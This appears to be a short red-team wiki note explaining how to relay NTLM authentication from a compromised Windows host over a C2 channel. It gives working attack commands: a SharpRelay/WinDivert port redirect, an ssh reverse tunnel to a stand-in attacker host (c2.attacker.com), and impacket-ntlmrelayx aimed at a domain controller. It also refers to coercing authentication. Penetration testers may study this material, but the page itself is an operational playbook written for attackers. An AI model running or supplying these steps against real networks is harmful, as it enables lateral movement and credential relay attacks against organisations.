---
title: NTLM Relaying on Windows
---

[[notes/ad/ntlm-relaying]] on a Windows computer over a C2.

Before you can begin you have to gain local admin privileges.

Windows computer: Redirect port 445 to 8445 with the WinDivert kernel driver and [SharpRelay](https://github.com/pkb1s/sharprelay).

~~~ bat
.\SharpRelay.exe smbredir %cd%\WinDivert.sys 445 8445
~~~

Windows computer: Establish a reverse SOCKS proxy to your C2 server and forward `0.0.0.0:8445` to port 445 on your C2 server.

~~~ bat
ssh -R 127.0.0.1:1080 -L 0.0.0.0:8445:127.0.0.1:445 proxy@c2.attacker.com
~~~

C2 server: Start `impacket-ntlmrelayx` over the SOCKS proxy so that traffic flows back into the victim network.

~~~ bash
proxychains impacket-ntlmrelayx -t smb://dc01.corp.local -smb2support
~~~

Windows computer: Coerce NTLM authentication to this machine.

Untested tools:

- [lsarelayx](https://github.com/CCob/lsarelayx), registers LSA authentication provider

References:

- [NTLM relaying via Cobalt Strike ](https://web.archive.org/web/20220922125148/https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
